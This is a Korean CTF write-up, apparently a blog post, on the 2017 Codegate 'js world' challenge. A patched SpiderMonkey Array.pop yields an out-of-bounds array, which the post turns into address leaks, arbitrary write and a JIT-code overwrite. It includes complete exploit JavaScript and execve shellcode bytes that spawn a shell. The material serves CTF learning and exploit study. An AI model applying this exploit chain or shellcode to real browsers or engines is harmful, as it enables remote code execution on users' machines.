---
layout: post
title: 2017 codegate js world write up
categories: Browser
tags: [CTF, firefox]
---

## 목차

- 환경구성
- OOB 배열 생성
- 데이터 읽기
- Array 객체 분석
- Exploit


<hr/>

## 환경 구성

```bash
sudo apt-get install python-pip gcc make g++ perl python autoconf -y
mkdir mozilla
cd mozilla
wget http://ftp.mozilla.org/pub/mozilla.org/js/mozjs-24.2.0.tar.bz2
tar xjf mozjs-24.2.0.tar.bz2
```



이렇게 입력을 하면 `mozilla 24.2.0`를 다운받을 수 있다.



이제 **주어진 파일과 기존 mozilla 24.2.0이 뭐가 달라졌는 지** 보면된다. 

`js_array.cpp`가 주어졌으니 이 파일을 원본 파일과 비교해보면 되고 원본 파일의 위치는 다음과 같다.

```bash
mozjs-24.2.0/js/src/js_array.cpp
```

리눅스의 `diff`를 이용해서 비교한 결과는 다음과 같다.

```diff
1947,1950c1947
<     if (index == 0) {
<         /* Step 4b. */
<         args.rval().setUndefined();
<     } else {
---
> 
1962c1959
<     }
---
> 
1967c1964
<     if (obj->isNative() && obj->getDenseInitializedLength() > index)
---
>     if (obj->isNative())
```

조금 더 한 눈에 보여주는 사진은 다음과 같다.

![1](https://user-images.githubusercontent.com/43925259/67089040-a635f380-f1e1-11e9-9e83-cb559cb167a7.PNG)

빨간색 부분이 변한 부분이다.  Array는 인덱스와 길이 정보를 가진다. 



**기존의 코드엔 pop 명령어를 사용할 때 Array의 index가 0이면 길이 정보가 감소하지 않고 index가 0이 아닐때는 길이 정보를 하나 감소하는 루틴**이 있었다. **하지만 그 루틴을 제거** 해버린 모습이다.



이제 원본 소스를 주어진 파일대로 수정한 후 컴파일을 진행할 것이다. 주어진 파일을 쓰지않고 다운받아서 컴파일을 하는 이유는 심볼이 없기 때문이다. 컴파일 명령은 다음과 같다.

```bash
mkdir build
cd build
../mozjs-24.2.0/js/src/configure
make
```



<hr/>

## OOB 배열 생성

기존 Array는 pop할때 인덱스가 0이라면 아무 작업을 하지 않는다. 하지만 현재는 **인덱스가 0일 때 pop을 하면 1이 감소되면서 길이 정보가 0xffffffff가 되기 때문에 OOB가 발생**한다. 

OOB가 발생하는 배열을 만들어서 OOB Read를 하는 소스 코드는 다음과 같다.

```javascript
a = [1, 2]
b = [3, 4]

for (var i = 0; i < 3; i++)
	a.pop()

print ('length: ' + a.length)

for (var i = 0; i < 10; i++)
	print(a[i]);
```

a라는 배열 바로 뒤에 b 배열을 두고 pop을 통해서 oob를 트리거 했다.



해당 코드를 **실행하는 방법**은 build에 들어있는 js라는 파일을 이용하면 된다. **js파일의 인자로 작성한 파일을 넘겨주면 실행이 된다.** (ex: build/js exp.js)



실행했을 때의 결과는 다음과 같다.

```
length: 4294967295
undefined
undefined
6.9063791040899e-310
6.9063790999006e-310
0
6.9063791034334e-310
4.243991582e-314
4.243991583e-314
3
4

```

length 값이 42억으로 나온걸 봐선 unsigned int인 듯 하다. 그리고 undefined는 배열의 요소가 있었던 자리였는데, pop을 통해 뺐기 때문에 뜨는 것이다.  그 이후에 소수가 막 나오다가 3, 4가 나오는데 b 배열의 요소 값일 것이다.



<hr />

## 데이터 읽기

기본적으로 파이어폭스에서는 `jsval`을 `double`로 표현하는데 array를 통해서 `oob read` 및 `oob write`를 하기 위해선 double 데이터를 int로, int를 double 데이터로 바꿀 수 있어야 할 것이다.



그래서 dtoi 함수와 itod 함수를 만들었고 `dtoi` 부터 보겠다.

```javascript
function dtoi(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer, 0, 8);

	f[0] = data;
	
	res = "";
	for (var i = 0; i < bytes.length; i++)
		res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);

	return parseInt(res, 16);
}
```

먼저 `Float64Array 하나`와 `Uint8Array 8개`를 만들었는데, 숫자를 보면 알겠지만 Float는 8byte고 Uint는 1byte 배열이다. **Uint64Array 한개가 아니라 Uint8Array 8개인 이유는 리틀 엔디안으로 바꿔야하기 때문**이다.



그 후에 정렬해서 16진수 문자열 형태로 만들고 `parseInt`로 int로 만들면 된다.



이제 `itod`를 보겠다.

```javascript

function itod(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer);

	var res = [];
	var hexed = ('0000000000000000' + data.toString(16)).substr(-16);
	for (var i = 0; i < 16; i+=2)
		res.push(parseInt(hexed.substr(i, 2), 16));
	
	bytes.set(res.reverse());
	return f[0];	
}
```

마찬가지로 정렬해서 16진수로 만들고 이를 배열로 만든후 리틀 엔디안으로 만들어주기 위해 `reverse`를 한다. 여기서 하나 의아해할 수 있는 동작은 bytes에 값을 복사했는데 반환은 f[0]을 한다는 것인데, 같은 데이터를 가리키고 있다고 생각하면 된다.  (자세한건 [여기](https://developer.mozilla.org/ko/docs/Web/JavaScript/Typed_arrays)를 참고하면 될 것이다.)



아, 그리고 다음과 같이 파이썬 처럼 `hex` 함수도 만들었다.

```javascript
function hex(data)
{
	return '0x' + data.toString(16);
}

```



이제 다음과 같은 코드로 깔끔하게 출력을 해보겠다.

```javascript
function dtoi(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer, 0, 8);

	f[0] = data;
	
	res = "";
	for (var i = 0; i < bytes.length; i++)
		res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);

	return parseInt(res, 16);
}

function itod(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer);

	var res = [];
	var hexed = ('0000000000000000' + data.toString(16)).substr(-16);
	for (var i = 0; i < 16; i+=2)
		res.push(parseInt(hexed.substr(i, 2), 16));
	
	bytes.set(res.reverse());
	return f[0];	
}

function hex(data)
{
	return '0x' + data.toString(16);
}
	
a = [1, 2]
b = [3, 4]

for (var i = 0; i < 3; i++)
	a.pop()

print ('length: ' + a.length)

for (var i = 0; i < 10; i++)
	print (hex(dtoi(a[i])))
```

결과 값은 다음과 같다. (편-안)

```bash
length: 0xffffffff
0x7ff8000000000000
0x7ff8000000000000
0x7f5b15646358
0x7f5b15631820
0x0
0x7f5b15642f70
0x200000000
0x200000002
0x4008000000000000
0x4010000000000000
```



<hr />

## Array 객체 분석

다음과 같은 코드를 짜고 디버깅을 할 것이다.

```javascript
a = [0x41414141, 0x42424242, 0x43434343]
a.length = 0xdeadbeef
Math.atan(a)
```

`Math.atan`은 보통 **디버깅을 할 때 사용**한다. 인자로 a를 준 이유는 Math.atan에 브포를 걸고 해당 함수의 인자 확인을 통해 a에 쉽게 접근하기 위함이다.



`gdb -q build/js`로 gdb를 열고 `b *js::math_atan`를 통해 Math.atan에 브포를 건 뒤 `r [자바스크립트 파일 명]`로 실행한다. 



그럼 다음과 같은 화면이 보인다.

```c
   202     return cache->lookup(atan, x);
   203 }
   204 
   205 JSBool
   206 js::math_atan(JSContext *cx, unsigned argc, Value *vp)
   207 {
   208     CallArgs args = CallArgsFromVp(argc, vp);
   209 
   210     if (args.length() == 0) {
   211         args.rval().setDouble(js_NaN);
   212         return true;
```

math_atan 함수의 원형을 보면 대충 3번째 인자가 우리가 넣은 값이라고 생각된다. 그럼 `rdx`를 확인해보면 된다.

![2](https://user-images.githubusercontent.com/43925259/67089041-a7ffb700-f1e1-11e9-855a-9b1981e3ba88.PNG)

위 사진에서 빨간색 표시를 한 부분이 a라는 배열의 주소이다. 일반적으로 64bit 시스템에서 주소는 6byte를 사용한다. 위 사진에선 8byte를 모두 사용하고 있는데, **상위 2.5byte는 Type을 의미하고 하위 5.5byte는 Value**이다.



주소는 6byte고 보통 앞에 7이 붙기 때문에 앞에 7 붙히고 나머지 5.5byte 붙혀서 값을 보면 된다. 값을 보면 다음과 같다.

![3](https://user-images.githubusercontent.com/43925259/67089043-aa621100-f1e1-11e9-9007-a495e6ce7728.PNG)

<span style="color:red">빨간 부분: Array의 데이터의 주소</span>

<span style="color:blue">파란 부분: Array의 크기</span>

<span style="color:green">초록 부분: Array의 데이터</span>



처음에 작성한 코드를 보면 length 값을 직접적으로 0xdeadbeef로 변경 했었다. 하지만 그렇게 해도 oob는 발생하지 않은데 그 이유는 다음과 같다.

**배열의 크기는 총 2개가 존재**한다. 하나는 **실제 메모리상에 할당된 C++ 배열의 크기**, 또 하나는 **자바스크립트 상의 가상 배열의 크기**이다. **위 코드에선 단순히 가상 배열의 크기만 바뀌었기 때문에 OOB가 발생하지 않는다.**



즉 **실제 메모리에 할당된 C++ 배열의 크기를 바꿔주어야 OOB 취약점이 발생**하고 이를 위해 pop을 통해서 취약점을 트리거 하는 것이다. pop을 통해 oob array를 만든 후 디버깅을 해보면 다음과 같이 두 가지의 크기 모두 0xffffffff으로 표시된다.

![4](https://user-images.githubusercontent.com/43925259/67089047-ac2bd480-f1e1-11e9-9693-8d7f2940ab2c.PNG)



length가 바뀌게 되며 OOB Read는 쉽게 트리거 했었고 OOB Write를 트리거 하는 법에 대해서 잠깐 적어보자면, Array의 데이터 주소를 조작하는 법이 있다.



인덱스가 음수가 될 순 없기 때문에 현재 Array의 데이터 주소는 조작 못하지만, Array를 하나 더 만든 후 다음 Array의 데이터 주소를 찾아서 조작할 수 있다. 그 후엔 다음 Array를 가지고 조작된 주소로 부터 원하는대로 값을 쓰면 된다.



<hr/>

## Exploit

익스플로잇에 사용할 방법은 `JIT Code Overwrite`이다.

`JIT`는 쉽게 말해서 **자주 사용하는 코드를 미리 바이트 코드로 만들어놓고 메모리에 올려서 실행하는 것**이다. 여기서 중요한 점은 바이트 코드를 메모리에 올릴 때 메모리에 실행권한이 부여되기에 이 주소를 알 수 있다면 셸 코드를 넣을 수 있을 것이다.



익스 플로잇을 하기 전에 JIT가 어떻게 돌아가는지 부터 잠깐 살펴보겠다.

 `mozjs-24.2.0/js/src/jit/BaselineJIT.cpp`의 `EnterBaseline` 함수를 수정해볼 것이다. 해당 파일을 열어서 104번째 줄을 다음과 같이 수정하면 된다. **JIT가 트리거될 때 jitcode 주소를 출력해주는 것**이다.

```c++
// Single transition point from Interpreter to Baseline.
        
        printf("JIT: %p\n", data.jitcode);

        enter(data.jitcode, data.maxArgc, data.maxArgv, data.osrFrame, data.calleeToken,
              data.scopeChain, data.osrNumStackValues, data.result.address());
```



수정한 후 다시 make를 해주면 수정한 내용이 반영된다.



위에서 적은대로 JIT는 자주 사용하는 코드에 쓰이는데, 다른 말로 표현하면 **자주 호출되는 함수**라고 할 수 있다. 테스트를 위해 다음과 같은 코드를 작성했다.

```javascript
function test()
{
	print('hi')
}
	

for (var i = 0; i < 12; i++)
	test()

```



12까지 반복한 이유는 10~12번째 반복에 JIT 주소가 출력되었기 때문이다. 실행 결과는 다음과 같다.

```bash
hi
hi
hi
hi
hi
hi
hi
hi
hi
JIT: 0x7f4ca84f63d8
hi
JIT: 0x7f4ca84f6868
hi
JIT: 0x7f4ca84f6868
hi
```

10 ~ 12 번째 반복에 JIT가 트리거되어 주소가 출력되는 걸 확인할 수 있다. 처음에 출력된 주소와 그 후에 출력된 주소가 조금 차이가 있는데 2~3번째 출력된 주소가 test 함수의 jitcode 주소이다.



math.atan을 통해 디버깅을 해보면 해당 주소에 모든 권한이 있는 걸 확인할 수 있다.

```
JIT: 0x7ffff7ff3430
hi
JIT: 0x7ffff7ff3910
hi
JIT: 0x7ffff7ff3910
hi
```

![5](https://user-images.githubusercontent.com/43925259/67089048-ad5d0180-f1e1-11e9-9589-825dfff0033a.PNG)



익스플로잇 과정은 다음과 같다.

1. Create two arrays

2. OOB trigger (First Array)

3. next Array addr leak

4. JIT code address leak

5. JIT code overwrite

6. JIT code execute (function call)



1~2번은 생략하고 3번부터 하겠다. 1~2번에 해당하는 코드는 다음과 같다.

```javascript
function dtoi(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer, 0, 8);

	f[0] = data;
	
	res = "";
	for (var i = 0; i < bytes.length; i++)
		res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);

	return parseInt(res, 16);
}

function itod(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer);

	var res = [];
	var hexed = ('0000000000000000' + data.toString(16)).substr(-16);
	for (var i = 0; i < 16; i+=2)
		res.push(parseInt(hexed.substr(i, 2), 16));
	
	bytes.set(res.reverse());
	return f[0];	
}

function hex(data)
{
	return '0x' + data.toString(16);
}
	
a = [1, 2]
b = [3, 4]

for (var i = 0; i < 3; i++)
	a.pop()
```

OOB가 발생하는 Array의 다음에 다른 배열을 만들었다. 처음에 oob array를 통해 10개의 값을 출력해보니 9~10 번째에 두 번째 array의 데이터가 출력되었다.  위에서 작성했었던 결과 값을 다시 가져와보면 다음과 같다.

```bash
undefined
undefined
6.9063791040899e-310
6.9063790999006e-310
0
6.9063791034334e-310
4.243991582e-314
4.243991583e-314
3
4
```

또한 Array 객체 분석을 할 때 캡쳐했던 화면은 다음과 같다.

![6](https://user-images.githubusercontent.com/43925259/67089051-af26c500-f1e1-11e9-9f60-362432905151.PNG)

초록색 부분이 데이터고 빨간색 부분이 데이터의 주소라고 했었는데, 3, 4가 데이터라면 이 값이 나오기 전전전 값이 해당 데이터를 가리키는 **데이터의 주소**일 것이다. 즉 `6.9063791034334e-310` 이 값이 데이터의 주소일 것이고 이는 OOB Array의 인덱스에 `5`를 주면 접근할 수 있다. 이렇게 next Array addr을 쉽게 릭할 수 있다.



이 주소를 릭 하는 이유는 aaw를 트리거하기 위함이다. 이제 이 주소를 변경하고 두 번째 배열에 값을 수정함으로써 원하는 곳에 원하는 값을 쓸 수 있다. 하지만 **값을 넣을땐 double 형으로 넣어야 함에 주의**해야 한다. 그게 싫다면 Uin32Array를 생성해서 그 주소를 찾으면 되는데 개인적으로 이게 더 편한거 같다.



이제 jitcode 주소를 leak하면 된다. 해당 주소를 알아내기 위해 Math.atan을 이용해서 디버깅을 해보겠다. 테스트 코드는 다음과 같다.

```javascript
function dtoi(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer, 0, 8);

	f[0] = data;
	
	res = "";
	for (var i = 0; i < bytes.length; i++)
		res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);

	return parseInt(res, 16);
}

function itod(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer);

	var res = [];
	var hexed = ('0000000000000000' + data.toString(16)).substr(-16);
	for (var i = 0; i < 16; i+=2)
		res.push(parseInt(hexed.substr(i, 2), 16));
	
	bytes.set(res.reverse());
	return f[0];	
}

function hex(data)
{
	return '0x' + data.toString(16);
}

function get_shell()
{
	print('hi')
}
	
a = [1, 2]
b = [3, 4]

for (var i = 0; i < 3; i++)
	a.pop()

next_array_addr = dtoi(a[5]);

for (var i = 0; i < 12; i++)
	get_shell();

Math.atan()
```

math_atan에 브포를 걸고 실행해보면 위에서 설정을 해놨기 때문에 jitcode 주소가 출력이 될텐데, 해당 부분의 값을 잠깐 살펴보면 다음과 같다.

![7](https://user-images.githubusercontent.com/43925259/67089054-b057f200-f1e1-11e9-913e-8ca3b917f0a6.PNG)

이제 이 부분에다가 셸 코드를 박을건데, 그러면 이 jitcode의 주소를 가지고 있는 곳의 위치를 구해야 하기 때문에 search 명령을 사용했다.

![8](https://user-images.githubusercontent.com/43925259/67089056-b221b580-f1e1-11e9-8048-d47480c8dbcf.PNG)

그럼 총 3개의 값이 나온다. 앞의 2개의 값은 OOB Array 이전에 있는 값이라서 접근 조차도 못하고 세 번째 값이 우리가 원하는 값이다. 3번째 주소에 저장된 값을 보면 다음과 같다.

![9](https://user-images.githubusercontent.com/43925259/67089057-b352e280-f1e1-11e9-845a-2b7704622fef.PNG)

여기서 첫 번째 주소가 우리가 원하는 jitcode의 주소이다. 이 주소를 leak해야 하는데, 위 사진에서 다른 주소는 다 aslr의 영향을 받아서 변하지만 `0x0000015000000161`는 변하지 않는 값이었다. 또한 **search로 검색해도 하나 밖에 나오지 않는 유일한 값**이다. 그러니 위 값을 가지고 index를 계속 증가시켜가면서 찾은 뒤에 인덱스를 2 빼주면 jitcode의 주소를 leak할 수 있다. 작성한 코드는 다음과 같다.

```javascript
jitcode_offset = 0;
for (var i = 0; i < 0x10000; i++)
{
	if (dtoi(a[i]) == parseInt("0x0000015000000161", 16))
	{
		jitcode_offset = i - 2;
		break
	}
}

print ('JIT Addr: ' + hex(dtoi(a[jitcode_offset])))
```

출력된 값은 우리가 소스를 수정해서 출력된 JIT 주소와 동일하다.



이제 셸 코드를 jitcode 주소에다가 박으면 된다.



먼저 OOB Array에서 Next Array의 데이터 주소를 조작하고 Next Array의 인덱스를 0, 1, 2 이렇게 올려가며 값을 쓰는 방법이 있다. 하지만 이 방법을 사용할 경우 두 가지의 단점이 존재한다.

1. 7byte밖에 컨트롤이 안된다.
2. 배열의 요소 수를 더 늘려서 생성해야 하는데, 이 경우 조금 떨어진 곳에 할당되서 추가적으로 for 문을 돌려서 leak하는 과정을 거쳐야한다.



8byte씩 값을 쓰고싶어도 소수로 들어가다보니 뭔가 문제가 있는지 7byte만 드가고 마지막은 0으로 고정이 되었으며 가장 큰 자리 숫자의 값이 어느정도 클 경우 가장 작은 자리 숫자의 값이 변해버리는 현상이 존재하였다.  근데 이 경우도 6byte 단위로 셸 코딩하면 다음과 같이 풀 수는 있긴하다.

![10](https://user-images.githubusercontent.com/43925259/67089060-b51ca600-f1e1-11e9-9bd8-a35ef167a987.PNG)

무조건 0이 붙는걸 add나 xor을 이용해 아무 레지스터에도 영향이 없도록 bypass하고 셸 코드를 짠 모습이다. 근데 이렇게 커스텀 셸 코드를 짜기보다 기존 셸 코드를 박는 방법이 더 편해서 그 방법을 소개할려고 한다.



작성한 코드는 다음과 같다.

```javascript
function dtoi(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer, 0, 8);

	f[0] = data;
	
	res = "";
	for (var i = 0; i < bytes.length; i++)
		res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);

	return parseInt(res, 16);
}

function itod(data)
{
	var buffer = new ArrayBuffer(8);
	var f = new Float64Array(buffer);
	var bytes = Uint8Array(buffer);

	var res = [];
	var hexed = ('0000000000000000' + data.toString(16)).substr(-16);
	for (var i = 0; i < 16; i+=2)
		res.push(parseInt(hexed.substr(i, 2), 16));
	
	bytes.set(res.reverse());
	return f[0];	
}

function hex(data)
{
	return '0x' + data.toString(16);
}

function get_shell()
{
	print('hi')
}
	
a = [1, 2]
b = [3, 4]

for (var i = 0; i < 3; i++)
	a.pop();

Math.atan(a);
next_array_offset = 5;

for (var i = 0; i < 12; i++)
	get_shell();

jitcode_offset = 0;
for (var i = 0; i < 0x10000; i++)
{
	if (dtoi(a[i]) == parseInt("0x0000015000000161", 16))
	{
		jitcode_offset = i - 2;
		break
	}
}

print ('JIT Addr: ' + hex(dtoi(a[jitcode_offset])))

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

for (var i = 0; i < shellcode.length % 4; i++)
	shellcode += '\x90'

for (var i = 0; i < (shellcode.length / 4); i++)
{
	s = shellcode.substr(i*4, (i*4)+4)

	r =  s[3].charCodeAt() * 0x1000000
	r += s[2].charCodeAt() * 0x10000
	r += s[1].charCodeAt() * 0x100
	r += s[0].charCodeAt() * 0x1

	a[next_array_offset] = itod(dtoi(a[jitcode_offset]) + 4 * i);
	b[0] = itod(r)
}

get_shell();
```



shellcode를 4byte씩 나눠서 넣을건데, 먼저 길이가 4의 배수가 아니면 NOP으로 패딩을 한다. 그 후에 4byte씩 자른 후에 리틀엔디안으로 변경 후 값을 넣는 것이다.



<hr/>

## 레퍼런스

- https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/?fbclid=IwAR2sPFa4HXs0NFfF7ek5XlriJPXd2-Ia1DlPDmlvPtwXhWEPKanw0Bu21LE
- https://github.com/allpaca/jsExploit_CTF/blob/master/Firefox%20Exploits%20in%20CTF.pdf
